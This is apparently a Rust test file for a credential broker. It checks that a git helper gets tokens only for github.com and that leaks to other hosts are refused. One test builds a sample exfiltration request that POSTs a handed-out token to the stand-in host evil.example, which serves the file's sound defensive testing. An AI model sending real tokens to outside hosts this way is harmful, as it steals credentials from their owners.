use std::time::Duration;

use openmoat_core::rule_id::{PROXY_HELPER, PROXY_SECRET};
use openmoat_core::{Policy, Verdict};
use zeroize::Zeroizing;

use crate::broker::{Broker, Carried};

/// Made at run time: no token-shaped literal in the source.
fn minted() -> String {
    format!("ghs{}{}", '_', "0123456789abcdefFAKEFAKE")
}

fn broker() -> Broker {
    let policy = Policy::parse(
        "version: 1\nsecrets:\n  - id: gh-git\n    host: github.com\n    header: Authorization\n    \
         helper: { git: { username: x-access-token } }\n    source: { env: FAKE_A }\n  \
         - id: plain\n    host: api.example.com\n    header: X-Key\n    source: { env: FAKE_B }\n",
    )
    .unwrap();
    let secrets = policy
        .secrets
        .into_iter()
        .map(|s| {
            // Unrelated values: the leak check also finds a value's long parts.
            let value = if s.id == "plain" {
                format!("key{}{}", '-', "zyxwvutsrqponmlkjihgfedcba98")
            } else {
                minted()
            };
            (s, Zeroizing::new(value))
        })
        .collect();
    Broker::new(secrets).unwrap()
}

#[test]
fn the_git_helper_gets_the_value_for_the_secrets_own_host() {
    let b = broker();
    let out = b.hand_out("git", "gh-git", Some("github.com")).unwrap();
    assert_eq!(*out.value, minted());
    assert_eq!(
        (out.host, out.username),
        ("github.com", Some("x-access-token"))
    );
    assert_eq!(out.decision.verdict, Verdict::Allow);
    assert_eq!(out.decision.rules, [PROXY_HELPER]);
    assert!(!out.decision.reasons.join(" ").contains(&minted()));
    assert!(!format!("{out:?}").contains(&minted()));
}

#[test]
fn a_helper_asking_for_another_host_tool_or_secret_gets_nothing() {
    let b = broker();
    for (tool, id, host, why) in [
        ("git", "gh-git", Some("evil.example"), "only github.com"),
        ("git", "gh-git", Some("api.github.com"), "only github.com"),
        ("git", "gh-git", None, "only github.com"),
        ("aws", "gh-git", None, "no `helper: aws`"),
        ("git", "plain", Some("api.example.com"), "no `helper: git`"),
        ("git", "missing", Some("github.com"), "does not broker"),
    ] {
        let refused = b.hand_out(tool, id, host).unwrap_err();
        assert_eq!(refused.verdict, Verdict::Deny, "{tool} {id} {host:?}");
        assert_eq!(refused.rules, [PROXY_HELPER]);
        let reason = refused.reasons.join(" ");
        assert!(reason.contains(why), "{tool} {id} {host:?}: {reason}");
        assert!(!reason.contains(&minted()));
    }
}

#[test]
fn an_expired_value_is_not_handed_out() {
    let b = broker();
    let rotation = b.rotation("gh-git").unwrap();
    rotation
        .renew(Zeroizing::new(minted()), Duration::ZERO)
        .unwrap();
    let refused = b.hand_out("git", "gh-git", Some("github.com")).unwrap_err();
    assert!(refused.reasons[0].contains("expired"), "{refused:?}");
}

/// The attack: a command asks the helper for the token, then sends it to a
/// host that is not the secret's audience. Where the proxy reads the request,
/// it is refused with `proxy-secret` before anything is sent.
#[test]
fn a_handed_out_value_sent_to_another_host_is_refused() {
    let b = broker();
    let out = b.hand_out("git", "gh-git", Some("github.com")).unwrap();
    let exfil = format!(
        "POST /collect HTTP/1.1\r\nHost: evil.example\r\n\r\ntoken={}",
        out.value.as_str()
    );
    let leak = b.leak("evil.example", exfil.as_bytes()).unwrap();
    assert_eq!((leak.id, leak.carried), ("gh-git", Carried::Value));
    let decision = leak.decision("evil.example");
    assert_eq!(decision.rules, [PROXY_SECRET]);
    // Its own host may receive it.
    assert!(b.leak("github.com", exfil.as_bytes()).is_none());
}
